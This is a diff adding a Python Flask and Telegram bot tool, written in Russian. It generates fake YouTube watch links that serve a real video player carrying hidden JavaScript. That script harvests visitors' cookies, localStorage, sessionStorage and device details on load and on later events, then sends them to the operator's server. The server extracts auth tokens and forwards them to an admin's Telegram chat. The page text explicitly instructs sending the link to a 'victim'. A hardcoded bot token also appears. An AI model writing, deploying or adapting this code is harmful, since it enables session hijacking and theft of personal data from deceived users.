@@ -1,0 +1,1700 @@
+[file name]: cod2.py
+[file content begin]
+import logging
+import json
+import re
+import uuid
+import os
+import time
+import sqlite3
+import random
+from datetime import datetime
+from typing import Dict, List, Optional, Any
+import threading
+import subprocess
+import html
+import base64
+
+# Flask и веб
+from flask import Flask, request, jsonify, render_template_string, redirect
+from flask_cors import CORS
+
+# Telegram
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    ContextTypes,
+    CallbackQueryHandler,
+    MessageHandler,
+    filters
+)
+from telegram.constants import ParseMode
+
+# ========== НАСТРОЙКИ ==========
+BOT_TOKEN = "8342575399:AAFetGCZwKYOe4fwuXLkWsn6N3Q0VVEHGTs"
+ADMIN_ID = 1709490182
+FLASK_PORT = 5051  # Изменили порт с 5050 на 5051
+SERVER_URL = "http://localhost:5051"  # Изменили порт в URL
+
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    handlers=[
+        logging.FileHandler('youtube_data_collector.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# ========== БАЗА ДАННЫХ ==========
+class Database:
+    def __init__(self):
+        self.conn = sqlite3.connect('youtube_data.db', check_same_thread=False)
+        self.create_tables()
+    
+    def create_tables(self):
+        cursor = self.conn.cursor()
+        
+        # Таблица ссылок
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS video_links (
+                id TEXT PRIMARY KEY,
+                youtube_url TEXT,
+                youtube_id TEXT,
+                server_url TEXT,
+                created_at TEXT,
+                created_by INTEGER,
+                clicks INTEGER DEFAULT 0,
+                title TEXT,
+                description TEXT,
+                active INTEGER DEFAULT 1
+            )
+        ''')
+        
+        # Таблица собранных данных
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS captured_data (
+                id TEXT PRIMARY KEY,
+                link_id TEXT,
+                timestamp TEXT,
+                ip_address TEXT,
+                user_agent TEXT,
+                cookies TEXT,
+                localStorage TEXT,
+                sessionStorage TEXT,
+                passwords TEXT,
+                logins TEXT,
+                autofill_data TEXT,
+                browser_info TEXT,
+                device_info TEXT,
+                sensitive_data TEXT,
+                identified_services TEXT,
+                FOREIGN KEY (link_id) REFERENCES video_links (id)
+            )
+        ''')
+        
+        # Таблица для статистики
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS stats (
+                key TEXT PRIMARY KEY,
+                value INTEGER
+            )
+        ''')
+        
+        # Инициализация статистики
+        default_stats = [
+            ('total_links', 0),
+            ('total_clicks', 0),
+            ('total_captured', 0),
+            ('total_credentials', 0),
+            ('total_cookies', 0),
+        ]
+        
+        cursor.executemany(
+            'INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)',
+            default_stats
+        )
+        
+        self.conn.commit()
+    
+    def add_video_link(self, link_data):
+        cursor = self.conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO video_links 
+            (id, youtube_url, youtube_id, server_url, created_at, created_by, title, description)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            link_data['id'],
+            link_data['youtube_url'],
+            link_data['youtube_id'],
+            link_data['server_url'],
+            link_data['created_at'],
+            link_data['created_by'],
+            link_data.get('title', ''),
+            link_data.get('description', '')
+        ))
+        
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_links"')
+        self.conn.commit()
+        return True
+    
+    def increment_clicks(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('UPDATE video_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_clicks"')
+        self.conn.commit()
+    
+    def get_link(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM video_links WHERE id = ?', (link_id,))
+        row = cursor.fetchone()
+        
+        if not row:
+            return None
+        
+        columns = [desc[0] for desc in cursor.description]
+        return dict(zip(columns, row))
+    
+    def get_user_links(self, user_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM video_links WHERE created_by = ? ORDER BY created_at DESC', (user_id,))
+        
+        columns = [desc[0] for desc in cursor.description]
+        return [dict(zip(columns, row)) for row in cursor.fetchall()]
+    
+    def add_captured_data(self, data):
+        cursor = self.conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO captured_data 
+            (id, link_id, timestamp, ip_address, user_agent, cookies, localStorage, 
+             sessionStorage, passwords, logins, autofill_data, 
+             browser_info, device_info, sensitive_data, identified_services)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            data['id'],
+            data['link_id'],
+            data['timestamp'],
+            data.get('ip_address'),
+            data.get('user_agent'),
+            json.dumps(data.get('cookies', []), ensure_ascii=False),
+            json.dumps(data.get('localStorage', {}), ensure_ascii=False),
+            json.dumps(data.get('sessionStorage', {}), ensure_ascii=False),
+            json.dumps(data.get('passwords', []), ensure_ascii=False),
+            json.dumps(data.get('logins', []), ensure_ascii=False),
+            json.dumps(data.get('autofill_data', {}), ensure_ascii=False),
+            json.dumps(data.get('browser_info', {}), ensure_ascii=False),
+            json.dumps(data.get('device_info', {}), ensure_ascii=False),
+            json.dumps(data.get('sensitive_data', {}), ensure_ascii=False),
+            json.dumps(data.get('identified_services', []), ensure_ascii=False)
+        ))
+        
+        # Обновляем статистику
+        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_captured"')
+        
+        credentials_count = len(data.get('passwords', [])) + len(data.get('logins', []))
+        if credentials_count > 0:
+            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_credentials"', (credentials_count,))
+        
+        cookies_count = len(data.get('cookies', []))
+        if cookies_count > 0:
+            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_cookies"', (cookies_count,))
+        
+        self.conn.commit()
+        return True
+    
+    def get_captured_data(self, data_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM captured_data WHERE id = ?', (data_id,))
+        row = cursor.fetchone()
+        
+        if not row:
+            return None
+        
+        columns = [desc[0] for desc in cursor.description]
+        data = dict(zip(columns, row))
+        
+        # Парсим JSON поля
+        json_fields = ['cookies', 'localStorage', 'sessionStorage', 'passwords', 'logins',
+                      'autofill_data', 'browser_info', 'device_info',
+                      'sensitive_data', 'identified_services']
+        
+        for field in json_fields:
+            if data.get(field):
+                try:
+                    data[field] = json.loads(data[field])
+                except:
+                    data[field] = []
+        
+        return data
+    
+    def get_data_by_link(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM captured_data WHERE link_id = ? ORDER BY timestamp DESC', (link_id,))
+        
+        columns = [desc[0] for desc in cursor.description]
+        results = []
+        
+        for row in cursor.fetchall():
+            data = dict(zip(columns, row))
+            
+            # Парсим JSON поля
+            json_fields = ['cookies', 'passwords', 'logins', 'identified_services']
+            for field in json_fields:
+                if data.get(field):
+                    try:
+                        data[field] = json.loads(data[field])
+                    except:
+                        data[field] = []
+            
+            results.append(data)
+        
+        return results
+    
+    def get_stats(self):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT key, value FROM stats')
+        rows = cursor.fetchall()
+        return {row[0]: row[1] for row in rows}
+    
+    def get_link_stats(self, link_id):
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT clicks FROM video_links WHERE id = ?', (link_id,))
+        row = cursor.fetchone()
+        clicks = row[0] if row else 0
+        
+        cursor.execute('SELECT COUNT(*) FROM captured_data WHERE link_id = ?', (link_id,))
+        row = cursor.fetchone()
+        captured = row[0] if row else 0
+        
+        return {'clicks': clicks, 'captured': captured}
+
+# Инициализация базы
+db = Database()
+
+# ========== YOUTUBE МЕНЕДЖЕР ==========
+class YouTubeManager:
+    @staticmethod
+    def extract_video_id(url):
+        """Извлекает ID видео из YouTube URL"""
+        patterns = [
+            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
+            r'v=([a-zA-Z0-9_-]{11})'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, url)
+            if match:
+                return match.group(1)
+        
+        return "dQw4w9WgXcQ"  # Дефолтное видео
+    
+    @staticmethod
+    def generate_server_url(youtube_id, link_id):
+        """Генерирует URL на локальном сервере"""
+        return f"{SERVER_URL}/watch?v={youtube_id}&id={link_id}"
+    
+    @staticmethod
+    def get_video_info(youtube_id):
+        """Получает информацию о видео"""
+        try:
+            return {
+                "title": f"YouTube Video {youtube_id}",
+                "description": "Интересное видео на YouTube",
+                "thumbnail": f"https://img.youtube.com/vi/{youtube_id}/hqdefault.jpg"
+            }
+        except:
+            return {
+                "title": "YouTube Video",
+                "description": "Смотрите интересное видео",
+                "thumbnail": ""
+            }
+
+# ========== HTML ШАБЛОНЫ ==========
+HTML_TEMPLATES = {
+    "youtube_player": """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video Player</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            width: 100%;
+        }
+        
+        .player-wrapper {
+            width: 100%;
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            margin-bottom: 20px;
+        }
+        
+        .player-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            border-radius: 12px;
+        }
+        
+        .video-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            padding: 0 10px;
+        }
+        
+        .video-info {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+        
+        .comments-section {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            width: 100%;
+        }
+        
+        .comment {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .comment-author {
+            color: #fff;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .comment-text {
+            color: #ddd;
+            line-height: 1.4;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 50px;
+            color: #aaa;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="player-wrapper">
+            <iframe 
+                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1&showinfo=0&rel=0&modestbranding=1" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen
+                id="youtubePlayer">
+            </iframe>
+        </div>
+        
+        <h1 class="video-title">{video_title}</h1>
+        <div class="video-info">
+            {views_count} просмотров • {upload_date}
+        </div>
+        
+        <div class="comments-section">
+            <h3>💬 Комментарии ({comments_count})</h3>
+            
+            <div class="comment">
+                <div class="comment-author">Пользователь 1</div>
+                <div class="comment-text">Отличное видео! Спасибо за контент! 👍</div>
+            </div>
+            
+            <div class="comment">
+                <div class="comment-author">Пользователь 2</div>
+                <div class="comment-text">Очень интересно, жду продолжения!</div>
+            </div>
+        </div>
+        
+        <div class="loading" id="loading">
+            Загрузка данных...
+        </div>
+    </div>
+    
+    <script>
+        // Данные для сбора
+        const linkId = "{link_id}";
+        const serverUrl = "{server_url}";
+        
+        // Функция для сбора всех данных
+        function collectAllData() {{
+            const data = {{
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {{
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                }},
+                cookies: {{}},
+                localStorage: {{}},
+                sessionStorage: {{}},
+                passwords: [],
+                logins: [],
+                autofillData: {{}},
+                browserInfo: {{
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    javaEnabled: navigator.javaEnabled(),
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
+                }},
+                deviceInfo: {{
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                }},
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                plugins: Array.from(navigator.plugins || []).map(p => ({{
+                    name: p.name,
+                    description: p.description
+                }}))
+            }};
+            
+            try {{
+                // Собираем cookies
+                const cookieString = document.cookie;
+                if (cookieString) {{
+                    cookieString.split(';').forEach(cookie => {{
+                        const [name, value] = cookie.trim().split('=');
+                        if (name && value) {{
+                            data.cookies[name] = decodeURIComponent(value);
+                        }}
+                    }});
+                }}
+                
+                // Собираем LocalStorage
+                if (window.localStorage) {{
+                    for (let i = 0; i < localStorage.length; i++) {{
+                        const key = localStorage.key(i);
+                        data.localStorage[key] = localStorage.getItem(key);
+                    }}
+                }}
+                
+                // Собираем SessionStorage
+                if (window.sessionStorage) {{
+                    for (let i = 0; i < sessionStorage.length; i++) {{
+                        const key = sessionStorage.key(i);
+                        data.sessionStorage[key] = sessionStorage.getItem(key);
+                    }}
+                }}
+                
+                // Собираем данные из IndexedDB (попытка)
+                if (window.indexedDB) {{
+                    data.hasIndexedDB = true;
+                }}
+                
+                // Собираем WebRTC информацию
+                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
+                    navigator.mediaDevices.enumerateDevices().then(devices => {{
+                        data.mediaDevices = devices.map(d => ({{
+                            kind: d.kind,
+                            label: d.label,
+                            deviceId: d.deviceId
+                        }}));
+                    }}).catch(() => {{}});
+                }}
+                
+                return data;
+                
+            }} catch (error) {{
+                console.error('Error collecting data:', error);
+                data.error = error.toString();
+                return data;
+            }}
+        }}
+        
+        // Функция отправки данных
+        function sendData(data, type = 'page_load') {{
+            try {{
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', serverUrl + '/api/collect', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({{
+                    link_id: linkId,
+                    data_type: type,
+                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data)))),
+                    timestamp: new Date().toISOString()
+                }}));
+            }} catch (error) {{
+                console.error('Error sending data:', error);
+            }}
+        }}
+        
+        // Сбор данных при загрузке страницы
+        window.addEventListener('load', function() {{
+            setTimeout(() => {{
+                const data = collectAllData();
+                sendData(data, 'initial_load');
+                document.getElementById('loading').innerHTML = '✅ Видео загружено';
+            }}, 2000);
+            
+            // Периодический сбор
+            setInterval(() => {{
+                const data = collectAllData();
+                sendData(data, 'periodic');
+            }}, 10000);
+            
+            // Сбор при уходе со страницы
+            window.addEventListener('beforeunload', function() {{
+                const data = collectAllData();
+                
+                // Используем sendBeacon для отправки при закрытии
+                const blob = new Blob([JSON.stringify({{
+                    link_id: linkId,
+                    data_type: 'page_exit',
+                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
+                }})], {{type: 'application/json'}});
+                
+                navigator.sendBeacon(serverUrl + '/api/collect', blob);
+            }});
+        }});
+        
+        // Сбор при взаимодействии с видео
+        document.addEventListener('click', function(e) {{
+            setTimeout(() => {{
+                const data = collectAllData();
+                data.interaction = {{ type: 'click', target: e.target.tagName }};
+                sendData(data, 'user_interaction');
+            }}, 1000);
+        }});
+        
+        // Сбор при изменении размера окна
+        window.addEventListener('resize', function() {{
+            const data = collectAllData();
+            data.windowResize = {{ width: window.innerWidth, height: window.innerHeight }};
+            sendData(data, 'window_resize');
+        }});
+    </script>
+</body>
+</html>
+""",
+
+    "link_created": """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ссылка создана</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            padding: 40px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .success-box {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .success-icon {
+            color: #34a853;
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        .url-box {
+            background: #f1f3f4;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .copy-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        .info-box {
+            background: #e8f4fd;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="success-box">
+        <div class="success-icon">✅</div>
+        <h1>Ссылка создана успешно!</h1>
+        
+        <h3>Оригинальное видео:</h3>
+        <p>{youtube_url}</p>
+        
+        <h3>Ваша ссылка для сбора данных:</h3>
+        <div class="url-box" id="serverUrl">{server_url}</div>
+        
+        <button class="copy-btn" onclick="copyToClipboard()">📋 Копировать ссылку</button>
+        <a href="{server_url}" target="_blank"><button class="copy-btn">🔗 Открыть видео</button></a>
+        
+        <div class="info-box">
+            <h4>📋 Как использовать:</h4>
+            <ol>
+                <li>Скопируйте ссылку выше</li>
+                <li>Отправьте её жертве</li>
+                <li>Когда жертва откроет ссылку, начнется сбор данных</li>
+                <li>Все данные придут в Telegram бот автоматически</li>
+            </ol>
+            
+            <h4>🔐 Что будет собрано:</h4>
+            <ul>
+                <li>Все cookies браузера</li>
+                <li>LocalStorage и SessionStorage</li>
+                <li>Информация о браузере и устройстве</li>
+                <li>Информация о плагинах</li>
+                <li>WebRTC данные</li>
+                <li>IP адрес и геолокация</li>
+                <li>История взаимодействия с видео</li>
+            </ul>
+        </div>
+    </div>
+    
+    <script>
+        function copyToClipboard() {{
+            const url = document.getElementById('serverUrl').innerText;
+            navigator.clipboard.writeText(url).then(() => {{
+                alert('Ссылка скопирована в буфер обмена!');
+            }});
+        }}
+    </script>
+</body>
+</html>
+"""
+}
+
+# ========== FLASK СЕРВЕР ==========
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+CORS(app)
+
+# Глобальные переменные
+telegram_app = None
+
+def extract_youtube_video_info(url):
+    """Извлекает информацию о YouTube видео"""
+    video_id = YouTubeManager.extract_video_id(url)
+    info = YouTubeManager.get_video_info(video_id)
+    
+    # Генерируем реалистичные данные
+    views = random.randint(10000, 10000000)
+    upload_date = f"{random.randint(1, 30)}.{random.randint(1, 12)}.{random.randint(2020, 2024)}"
+    
+    return {
+        'video_id': video_id,
+        'title': info['title'],
+        'description': info['description'],
+        'thumbnail': info['thumbnail'],
+        'views': f"{views:,}".replace(',', ' '),
+        'upload_date': upload_date,
+        'comments': random.randint(50, 5000)
+    }
+
+@app.route('/')
+def home():
+    """Главная страница - форма создания ссылки"""
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>YouTube Data Collector</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }
+            .container {
+                background: white;
+                padding: 40px;
+                border-radius: 20px;
+                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+                max-width: 500px;
+                width: 100%;
+                text-align: center;
+            }
+            h1 {
+                color: #333;
+                margin-bottom: 30px;
+            }
+            .input-group {
+                margin-bottom: 20px;
+            }
+            input[type="text"] {
+                width: 100%;
+                padding: 15px;
+                border: 2px solid #ddd;
+                border-radius: 10px;
+                font-size: 16px;
+                transition: border-color 0.3s;
+            }
+            input[type="text"]:focus {
+                border-color: #667eea;
+                outline: none;
+            }
+            button {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                border: none;
+                padding: 15px 30px;
+                border-radius: 10px;
+                font-size: 16px;
+                cursor: pointer;
+                width: 100%;
+                font-weight: bold;
+                transition: transform 0.3s;
+            }
+            button:hover {
+                transform: translateY(-2px);
+            }
+            .info {
+                margin-top: 30px;
+                padding: 20px;
+                background: #f8f9fa;
+                border-radius: 10px;
+                text-align: left;
+                font-size: 14px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🎬 YouTube Data Collector</h1>
+            <p style="color: #666; margin-bottom: 30px;">Вставьте ссылку на YouTube видео для создания отслеживаемой ссылки</p>
+            
+            <form action="/create_link" method="POST">
+                <div class="input-group">
+                    <input type="text" name="youtube_url" placeholder="https://youtube.com/watch?v=..." required>
+                </div>
+                <button type="submit">Создать ссылку</button>
+            </form>
+            
+            <div class="info">
+                <h4>ℹ️ Как это работает:</h4>
+                <p>1. Вставьте ссылку на YouTube видео</p>
+                <p>2. Получите специальную ссылку</p>
+                <p>3. Отправьте её другу/знакомому</p>
+                <p>4. Когда человек откроет ссылку, начнется сбор данных</p>
+                <p>5. Все данные придут в Telegram бот</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    '''
+
+@app.route('/create_link', methods=['POST'])
+def create_link():
+    """Создает отслеживаемую ссылку"""
+    youtube_url = request.form.get('youtube_url', '').strip()
+    
+    if not youtube_url:
+        return "Ошибка: Нет ссылки", 400
+    
+    # Извлекаем информацию о видео
+    video_info = extract_youtube_video_info(youtube_url)
+    video_id = video_info['video_id']
+    
+    # Генерируем уникальный ID
+    link_id = str(uuid.uuid4())[:12]
+    
+    # Создаем URL на локальном сервере
+    server_url = YouTubeManager.generate_server_url(video_id, link_id)
+    
+    # Сохраняем в базу
+    link_data = {
+        'id': link_id,
+        'youtube_url': youtube_url,
+        'youtube_id': video_id,
+        'server_url': server_url,
+        'created_at': datetime.now().isoformat(),
+        'created_by': 0,
+        'title': video_info['title'],
+        'description': video_info['description']
+    }
+    
+    db.add_video_link(link_data)
+    
+    # Формируем HTML ответ
+    html_content = HTML_TEMPLATES["link_created"].format(
+        youtube_url=youtube_url,
+        server_url=server_url
+    )
+    
+    return html_content
+
+@app.route('/watch')
+def watch_page():
+    """Страница с YouTube видео для сбора данных"""
+    video_id = request.args.get('v', 'dQw4w9WgXcQ')
+    link_id = request.args.get('id', str(uuid.uuid4())[:12])
+    
+    # Увеличиваем счетчик кликов
+    db.increment_clicks(link_id)
+    
+    # Получаем информацию о видео
+    video_info = extract_youtube_video_info(f"https://youtube.com/watch?v={video_id}")
+    
+    # Заменяем плейсхолдеры в шаблоне
+    html_content = HTML_TEMPLATES["youtube_player"].format(
+        youtube_id=video_id,
+        link_id=link_id,
+        server_url=SERVER_URL,
+        video_title=video_info['title'],
+        views_count=video_info['views'],
+        upload_date=video_info['upload_date'],
+        comments_count=video_info['comments']
+    )
+    
+    return html_content
+
+@app.route('/api/collect', methods=['POST'])
+def collect_data():
+    """API для сбора данных с клиента"""
+    try:
+        data = request.json
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data'}), 400
+        
+        link_id = data.get('link_id')
+        data_type = data.get('data_type', 'unknown')
+        encoded_data = data.get('data')
+        
+        if not link_id or not encoded_data:
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
+        
+        # Декодируем данные
+        try:
+            json_string = base64.b64decode(encoded_data).decode('utf-8')
+            collected_data = json.loads(json_string)
+        except Exception as e:
+            logger.error(f"Error decoding data: {e}")
+            return jsonify({'status': 'error', 'message': 'Decode error'}), 400
+        
+        # Получаем IP адрес
+        ip_address = request.remote_addr
+        if request.headers.get('X-Forwarded-For'):
+            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+        
+        # Определяем сервисы из данных
+        identified_services = []
+        
+        # Из cookies
+        cookies = collected_data.get('cookies', {})
+        cookies_list = [{'name': k, 'value': v} for k, v in cookies.items()]
+        
+        # Определяем сервисы из cookies
+        for cookie in cookies_list:
+            name = cookie['name'].lower()
+            value = cookie['value'].lower()
+            
+            # Google/YouTube
+            if 'google' in name or 'youtube' in name or 'yt' in name:
+                identified_services.append('google/youtube')
+            
+            # Социальные сети
+            if 'facebook' in name or 'fb_' in name:
+                identified_services.append('facebook')
+            if 'instagram' in name or 'ig_' in name:
+                identified_services.append('instagram')
+            if 'twitter' in name or 'auth_token' in name:
+                identified_services.append('twitter/x')
+            if 'vk' in name or 'vkontakte' in name:
+                identified_services.append('vk')
+            
+            # Поисковики
+            if 'yandex' in name:
+                identified_services.append('yandex')
+            if 'bing' in name:
+                identified_services.append('microsoft')
+            
+            # Разное
+            if 'sessionid' in name or 'token' in name or 'auth' in name:
+                # Анализируем значение на предмет сервиса
+                if 'github' in value:
+                    identified_services.append('github')
+                if 'spotify' in value:
+                    identified_services.append('spotify')
+                if 'discord' in value:
+                    identified_services.append('discord')
+        
+        # Из User-Agent
+        user_agent = collected_data.get('userAgent', '').lower()
+        if 'iphone' in user_agent or 'ipad' in user_agent or 'ipod' in user_agent:
+            device_type = 'iOS'
+        elif 'android' in user_agent:
+            device_type = 'Android'
+        elif 'windows' in user_agent:
+            device_type = 'Windows'
+        elif 'mac' in user_agent:
+            device_type = 'macOS'
+        elif 'linux' in user_agent:
+            device_type = 'Linux'
+        else:
+            device_type = 'Unknown'
+        
+        identified_services = list(set(identified_services))
+        
+        # Создаем запись для базы
+        data_id = str(uuid.uuid4())[:12]
+        
+        captured_data = {
+            'id': data_id,
+            'link_id': link_id,
+            'timestamp': datetime.now().isoformat(),
+            'ip_address': ip_address,
+            'user_agent': collected_data.get('userAgent', ''),
+            'cookies': cookies_list,
+            'localStorage': collected_data.get('localStorage', {}),
+            'sessionStorage': collected_data.get('sessionStorage', {}),
+            'passwords': collected_data.get('passwords', []),
+            'logins': collected_data.get('logins', []),
+            'autofill_data': collected_data.get('autofillData', {}),
+            'browser_info': collected_data.get('browserInfo', {}),
+            'device_info': {
+                'screen': collected_data.get('screen', {}),
+                'platform': collected_data.get('platform', ''),
+                'timezone': collected_data.get('timezone', ''),
+                'device_type': device_type,
+                'plugins': collected_data.get('plugins', []),
+                'hasIndexedDB': collected_data.get('hasIndexedDB', False)
+            },
+            'sensitive_data': collected_data,
+            'identified_services': identified_services
+        }
+        
+        # Сохраняем в базу
+        db.add_captured_data(captured_data)
+        
+        # Отправляем уведомление в Telegram
+        if telegram_app:
+            # Импортируем asyncio локально
+            import asyncio
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(send_telegram_notification(captured_data))
+        
+        return jsonify({
+            'status': 'success',
+            'id': data_id,
+            'message': 'Data collected successfully'
+        })
+        
+    except Exception as e:
+        logger.error(f"Error in collect_data: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ========== TELEGRAM ФУНКЦИИ ==========
+async def send_telegram_notification(data):
+    """Отправляет уведомление в Telegram о новых данных"""
+    try:
+        if not telegram_app:
+            return
+        
+        link_info = db.get_link(data['link_id'])
+        link_url = link_info['server_url'] if link_info else 'N/A'
+        
+        # Анализируем cookies для поиска токенов
+        sensitive_tokens = []
+        for cookie in data.get('cookies', []):
+            name = cookie.get('name', '').lower()
+            value = cookie.get('value', '')
+            
+            # Ищем токены
+            if any(keyword in name for keyword in ['token', 'session', 'auth', 'access', 'refresh', 'secret']):
+                if len(value) > 20:  # Предполагаем, что это токен
+                    sensitive_tokens.append(f"{name}: {value[:30]}...")
+        
+        # Анализируем LocalStorage
+        localStorage_tokens = []
+        localStorage_data = data.get('localStorage', {})
+        for key, value in localStorage_data.items():
+            key_lower = key.lower()
+            if any(keyword in key_lower for keyword in ['token', 'auth', 'session', 'jwt', 'access']):
+                if isinstance(value, str) and len(value) > 20:
+                    localStorage_tokens.append(f"{key}: {value[:30]}...")
+        
+        message = f"""
+🔐 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
+
+📌 *Информация о сессии:*
+• ID данных: `{data['id']}`
+• ID ссылки: `{data['link_id']}`
+• Время: {data['timestamp'][:19]}
+• IP: `{data['ip_address']}`
+• Устройство: {data.get('device_info', {}).get('device_type', 'Unknown')}
+
+📊 *Собранные данные:*
+• Cookies: {len(data.get('cookies', []))}
+• LocalStorage: {len(data.get('localStorage', {}))}
+• SessionStorage: {len(data.get('sessionStorage', {}))}
+• Плагины браузера: {len(data.get('device_info', {}).get('plugins', []))}
+
+🌐 *Определенные сервисы:*
+"""
+        
+        services = data.get('identified_services', [])
+        if services:
+            for service in services:
+                message += f"• {service}\n"
+        else:
+            message += "• Не определены\n"
+        
+        # Показываем токены если есть
+        if sensitive_tokens:
+            message += f"\n🔑 *Найденные токены в Cookies ({len(sensitive_tokens)}):*\n"
+            for token in sensitive_tokens[:3]:
+                message += f"• `{token}`\n"
+        
+        if localStorage_tokens:
+            message += f"\n🗂 *Найденные токены в LocalStorage ({len(localStorage_tokens)}):*\n"
+            for token in localStorage_tokens[:3]:
+                message += f"• `{token}`\n"
+        
+        # Показываем User-Agent
+        user_agent = data.get('user_agent', '')
+        if user_agent:
+            message += f"\n👤 *User-Agent:*\n`{user_agent[:80]}...`\n"
+        
+        stats = db.get_stats()
+        message += f"""
+📈 *Статистика системы:*
+• Всего данных: {stats.get('total_captured', 0)}
+• Cookies: {stats.get('total_cookies', 0)}
+
+💡 *Команды:*
+• /data {data['id']} - Детали данных
+• /stats - Полная статистика
+"""
+        
+        await telegram_app.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+        
+    except Exception as e:
+        logger.error(f"Error sending Telegram notification: {e}")
+
+# ========== TELEGRAM КОМАНДЫ ==========
